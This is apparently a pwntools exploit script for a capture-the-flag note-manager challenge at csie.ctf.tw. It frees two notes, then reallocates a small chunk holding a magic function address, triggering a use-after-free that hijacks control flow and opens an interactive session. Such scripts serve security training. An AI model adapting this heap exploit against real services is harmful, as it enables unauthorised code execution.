from pwn import *

host = '127.0.0.1'
port = 8888
host = 'csie.ctf.tw'
port = 10137

r = remote(host, port)

def add_note(size, content):
    # choice
    r.recvuntil(':')
    r.sendline(b'1')
    # new size
    r.recvuntil(':')
    r.sendline(str(size).encode())
    # content
    r.recvuntil(':')
    r.sendline(content)

def delete_note(index):
    # choice
    r.recvuntil(':')
    r.sendline(b'2')
    # index
    r.recvuntil(':')
    r.sendline(str(index).encode())

def print_note(index):
    # choice
    r.recvuntil(':')
    r.sendline(b'3')
    # index
    r.recvuntil(':')
    r.sendline(str(index).encode())

def exit():
    # choice
    r.recvuntil(':')
    r.sendline(b'4')

magic = 0x0000000000400c23

add_note(50, b'aaaaaaaa')
add_note(50, b'bbbbbbbb')
delete_note(0)
delete_note(1)
add_note(0x10, p64(magic))
print_note(0)

r.interactive()
